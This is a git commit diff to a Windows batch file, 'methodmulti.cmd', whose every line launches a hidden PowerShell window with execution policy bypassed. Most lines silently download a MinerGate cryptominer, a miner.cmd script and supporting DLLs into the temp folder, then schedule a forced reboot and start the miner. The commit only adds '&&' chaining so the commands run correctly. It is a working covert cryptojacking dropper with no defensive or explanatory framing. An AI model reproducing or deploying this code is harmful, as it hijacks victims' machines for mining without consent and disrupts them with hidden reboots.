b52e41be6fdb55f1f07407071446f41ca16f28f9
mediatui <57651467+mediatui@users.noreply.github.com>
2019-11-28 17:28:57 +1300

    Update methodmulti.cmd

--- multi/methodmulti.cmd
+++ multi/methodmulti.cmd
@@ -1,9 +1,9 @@
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/multi/minergate-cli.exe
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc-builtins64_92.dll
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
-cd %TMP% powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/multi/minergate-cli.exe
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc-builtins64_92.dll
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
+cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
